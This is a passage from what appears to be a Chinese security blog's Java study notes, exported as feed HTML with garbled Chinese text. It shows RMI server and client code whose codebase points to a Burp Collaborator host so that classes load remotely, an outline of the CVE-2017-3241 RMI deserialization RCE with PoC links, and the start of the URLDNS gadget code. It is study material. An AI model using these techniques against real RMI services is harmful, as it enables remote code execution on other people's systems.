&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSecurityManager&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Setup SecurityManager&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setSecurityManager&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">SecurityManager&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Calc&lt;/span> &lt;span style="color:#111">h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Calc&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">9093&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Naming&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">rebind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://192.168.31.175:9093/refobj&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.security.policy&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;E:\\JavaStudy\\test01\\client.policy&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.rmi.server.hostname&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;192.168.31.175&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.rmi.server.useCodebaseOnly&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;false&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">CalcServer&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// client.policy
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">grant&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">permission&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">security&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">AllPermission&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Clientéƒ¨åˆ†ï¼ˆç¡®ä¿ä¸ŽServerçš„classpathä¸åŒï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// HelloClient.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">rmiT&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.Serializable&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Naming&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.ArrayList&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.List&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HelloClient&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Serializable&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Payload&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">ArrayList&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">&amp;gt;{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ICalc&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ICalc&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">Naming&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://192.168.31.175:9093/refobj&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">li&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Payload&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">li&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">3&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">li&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">4&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sum&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">li&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.rmi.server.useCodebaseOnly&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;false&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.security.policy&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;E:\\JavaStudy\\test01\\client.policy&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.rmi.server.codebase&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://nxo90f9obuj1boi0bzbdanmca3gt4i.burpcollaborator.net/&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSecurityManager&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Setup SecurityManager&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setSecurityManager&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">SecurityManager&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HelloClient&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Icalc.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">rmiT&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.Remote&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.rmi.RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.List&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">ICalc&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Remote&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#75af00">sum&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿è¡ŒCalcServerå’ŒHelloClientï¼Œä¼šçœ‹åˆ°clientçš„æŠ¥é”™&lt;/p>
&lt;pre tabindex="0">&lt;code>Exception in thread &amp;#34;main&amp;#34; java.lang.ClassFormatError: Incompatible magic value 1013478509 in class file server/ICalc
&lt;/code>&lt;/pre>&lt;p>åŒæ—¶æ³¨æ„åˆ°æˆ‘ä»¬çš„burpæ”¶åˆ°äº†è¯·æ±‚&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220504013700746.png" alt="image-20220504013700746">&lt;/p>
&lt;p>åˆ©ç”¨çš„è¯å°†classæ”¾åœ¨WebæœåŠ¡å™¨çš„ /RMIClient$Payload.classå³å¯&lt;/p>
&lt;p>codebaseé€šè¿‡&lt;code>[Ljava.rmi.server.ObjID;&lt;/code>çš„&lt;code>classAnnotations&lt;/code>ï¼ˆç”±&lt;code>annotateClass&lt;/code>æ–¹æ³•å†™å…¥ï¼‰ä¼ é€’ï¼Œæ‰€ä»¥å³ä½¿æˆ‘ä»¬æ²¡æœ‰RMIå®¢æˆ·ç«¯ï¼Œåªè¦ä¿®æ”¹&lt;code>classAnnotations&lt;/code>çš„å€¼å°±å¯ä»¥æŽ§åˆ¶codebaseï¼ŒæŒ‡å‘æˆ‘ä»¬çš„ç½‘ç«™&lt;/p>
&lt;h2 id="cve-2017-3241">CVE-2017-3241&lt;/h2>
&lt;p>&lt;a href="https://www.daimajiaoliu.com/daima/4761a96151003fc">Java RMIè¿œç¨‹ååºåˆ—åŒ–ä»»æ„ç±»åŠè¿œç¨‹ä»£ç æ‰§è¡Œè§£æžï¼ˆCVE-2017-3241 ï¼‰&lt;/a> | &lt;a href="https://github.com/xfei3/CVE-2017-3241-POC">CVE-2017-3241-POC&lt;/a> | &lt;a href="http://www.code2sec.com/cve-2017-3241-java-rmi-registrybindfan-xu-lie-hua-lou-dong.html">CVE-2017-3241 Java RMI Registry.bind()ååºåˆ—åŒ–æ¼æ´ž&lt;/a> | &lt;a href="https://blog.csdn.net/LeeHDsniper/article/details/71599504">JAVA RMI ååºåˆ—åŒ–è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ž&lt;/a> | &lt;a href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/">ä¸€æ¬¡æ”»å‡»å†…ç½‘rmiæœåŠ¡çš„æ·±æ€&lt;/a> | &lt;a href="https://www.anquanke.com/post/id/85846">ã€æŠ€æœ¯åˆ†äº«ã€‘Java AMF3 ååºåˆ—åŒ–æ¼æ´žåˆ†æž&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>&amp;lt;=8u112 ç›´æŽ¥åˆ©ç”¨&lt;/p>
&lt;p>8u112&amp;lt; JDK &amp;lt; 8u241 éœ€è¦åé“¾æ¶æ„JRMPæœåŠ¡ç«¯ï¼Œæ‰€ä»¥éœ€è¦ç›®æ ‡æœåŠ¡å™¨èƒ½è®¿é—®æ”»å‡»è€…æŽ§åˆ¶çš„æœåŠ¡å™¨&lt;/p>
&lt;/blockquote>
&lt;p>TL;DRï¼šå¯¹äºŽRMIæœåŠ¡ï¼Œserverç«¯é™¤äº†æ­£å¸¸å®žçŽ°rmiæŽ¥å£çš„Aç±»ä¹‹å¤–è¿˜å­˜åœ¨ä¸€ä¸ªå®žçŽ°äº†readObjectæ–¹æ³•çš„PublicKnownç±»ï¼ˆæ¯”å¦‚å¸¸è§çš„ccï¼‰ï¼Œæˆ‘ä»¬çš„æ¶æ„å®¢æˆ·ç«¯å¯ä»¥åœ¨æœ¬åœ°ç”¨å®Œæ•´çš„ç±»åé‡å†™Aç±»ï¼ˆè°ƒç”¨PublicKnownçš„ååºåˆ—åŒ–ç›¸å…³æ–¹æ³•è¿›è¡Œrceï¼‰å¹¶ä½œä¸ºRMIçš„å‚æ•°ä¼ å…¥ï¼Œè§¦å‘rceï¼›pocä»£ç è¯·å‚è§&lt;a href="https://github.com/xfei3/CVE-2017-3241-POC">è¿™é‡Œ&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/1599551987770-38f4ea97-a031-4790-b11d-e73e60eab647.png" alt="image.png">&lt;/p>
&lt;p>å…·ä½“çš„å„ç‰ˆæœ¬ç»•è¿‡å‚è€ƒä¸Šé¢çš„ðŸ”—ï¼Œæˆ‘å°±ä¸ç­é—¨å¼„æ–§äº†å–µï¼ˆï¼‰&lt;/p></description></item><item><title>Javaå­¦ä¹ ç¬”è®°â…¢</title><link>https://amiaaaz.github.io/2022/03/23/java-study-notes-03/</link><pubDate>Wed, 23 Mar 2022 18:40:31 +0800</pubDate><guid>https://amiaaaz.github.io/2022/03/23/java-study-notes-03/</guid><description>&lt;h2 id="åºåˆ—åŒ–ååºåˆ—åŒ–">åºåˆ—åŒ–&amp;amp;ååºåˆ—åŒ–&lt;/h2>
&lt;p>ä¸ŽPHPç±»ä¼¼ï¼Œjavaçš„&lt;code>readObject&lt;/code>å¯¹æ ‡&lt;code>__wakeup&lt;/code>ï¼Œä½†ä¸å®Œå…¨ä¸€æ ·ï¼Œ&lt;code>readObject&lt;/code>å€¾å‘äºŽè§£å†³â€œååºåˆ—åŒ–æ—¶å¦‚ä½•è¿˜åŽŸä¸€ä¸ªå®Œæ•´å¯¹è±¡â€è¿™ä¸ªé—®é¢˜ï¼Œè€ŒPHPçš„&lt;code>__wakeup&lt;/code>å€¾å‘äºŽè§£å†³â€œååºåˆ—åŒ–åŽå¦‚ä½•åˆå§‹åŒ–è¿™ä¸ªå¯¹è±¡â€çš„é—®é¢˜ï¼Œå®ƒå¯ä»¥åœ¨ååºåˆ—åŒ–ä¹‹åŽæ‰§è¡Œåˆå§‹åŒ–æ“ä½œï¼Œè¯¥èµ‹çš„å€¼åŸºæœ¬ç”±&lt;code>__construct&lt;/code>æŽ§åˆ¶ï¼ŒçœŸæ­£çš„å…¥æ‰‹ç‚¹ä¸€èˆ¬åœ¨&lt;code>__destruct&lt;/code>ä¸­&lt;/p>
&lt;p>å¯¹javaæ¥è¯´ï¼Œä¸€ä¸ªå¯åˆ©ç”¨çš„&lt;code>readObject&lt;/code>æ˜¯é“¾å­æœ€åˆçš„èµ·ç‚¹&lt;/p>
&lt;p>åœ¨åºåˆ—åŒ–å¯¹è±¡æ—¶ä¼šè°ƒç”¨å¯¹è±¡çš„&lt;code>writeObject&lt;/code>æ–¹æ³•ï¼Œå‚æ•°ç±»åž‹æ˜¯&lt;code>ObjectOutputStream&lt;/code>ï¼Œè¿™ä¸ªç±»æœ‰ä¸€ä¸ª&lt;code>annotateClass&lt;/code>æ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡é‡å†™è¿™ä¸ªæ–¹æ³•æ¥å‘åºåˆ—åŒ–åŽçš„æ•°æ®ä¸­å†™å…¥å†…å®¹ï¼Œè¿™ä¸ªå†…å®¹ä½äºŽ&lt;code>objectAnnotation&lt;/code>ä¸­&lt;/p>
&lt;p>ç›¸åº”çš„ï¼Œååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨&lt;code>readObject&lt;/code>ï¼Œå¯ä»¥è¯»å‡ºå‰é¢å†™å…¥çš„å†…å®¹è¿›è¡Œå¤„ç†&lt;/p>
&lt;p>pythonçš„ååºåˆ—åŒ–å±å®³æœ€å¤§ï¼Œå¯ä»¥ç›´æŽ¥æ“æŽ§PVMæ ˆä¸Šçš„æŒ‡ä»¤&lt;/p>
&lt;h2 id="urldns">URLDNS&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">URLDNS&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">ObjectPayload&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">getObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//Avoid DNS resolution during payload creation
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">//Since the field &amp;lt;code&amp;gt;java.net.URL.handler&amp;lt;/code&amp;gt; is transient, it will not be part of the serialized payload.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">URLStreamHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">SilentURLStreamHandler&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span> &lt;span style="color:#111">ht&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// HashMap that will contain the URL
